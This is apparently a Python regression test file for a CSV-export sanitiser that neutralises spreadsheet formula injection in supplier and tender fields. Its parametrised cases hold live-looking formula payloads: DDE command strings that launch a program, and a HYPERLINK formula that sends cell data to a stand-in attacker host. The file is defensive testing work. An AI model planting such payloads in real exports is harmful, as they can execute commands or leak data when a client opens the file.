"""Regression guard for the M9 defect.

Supplier names and tender titles originate in the Tenders-SA database and are
written into CSV exports the client opens in Excel. Cells beginning with a
formula trigger executed on open. The lead export is the one handed to clients,
which makes this outbound, not merely internal.
"""

import csv
import io

import pytest

from app.services.text_utils import CSV_FORMULA_PREFIXES, csv_safe, write_csv_row


class TestCsvSafe:
    @pytest.mark.parametrize("payload", [
        '=cmd|\'/c calc\'!A1',
        '=HYPERLINK("http://attacker.example/?d="&A1,"Click")',
        "+1+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+9)*cmd|' /C calc'!A0",
        "\tleading tab",
        "\rleading carriage return",
    ])
    def test_formula_triggers_are_neutralised(self, payload):
        result = csv_safe(payload)
        assert result.startswith("'")
        assert not result.startswith(CSV_FORMULA_PREFIXES)

    @pytest.mark.parametrize("value", [
        "Sizwe Construction (Pty) Ltd",
        "Mokoena & Sons",
        "Road N2 Upgrade — Section 4",
        "",
    ])
    def test_ordinary_text_is_untouched(self, value):
        assert csv_safe(value) == value

    @pytest.mark.parametrize("value", [2_500_000, 4.5, None, True])
    def test_non_strings_pass_through(self, value):
        assert csv_safe(value) is value

    def test_the_character_is_preserved_not_stripped(self):
        """A supplier legitimately named '-Aone Trading' must keep its name."""
        assert csv_safe("-Aone Trading") == "'-Aone Trading"


class TestWriteCsvRow:
    def test_every_cell_in_a_row_is_escaped(self):
        stream = io.StringIO(newline="")
        writer = csv.writer(stream)
        write_csv_row(writer, ["=BAD()", "ok", "@ALSO_BAD()", 42])

        row = next(csv.reader(io.StringIO(stream.getvalue())))
        assert row == ["'=BAD()", "ok", "'@ALSO_BAD()", "42"]

    def test_a_round_trip_recovers_the_original_text(self):
        """The apostrophe is a display marker, so readers see the real value
        with one leading quote — the data itself is not corrupted."""
        stream = io.StringIO(newline="")
        write_csv_row(csv.writer(stream), ["=danger"])
        [[cell]] = list(csv.reader(io.StringIO(stream.getvalue())))
        assert cell.lstrip("'") == "=danger"
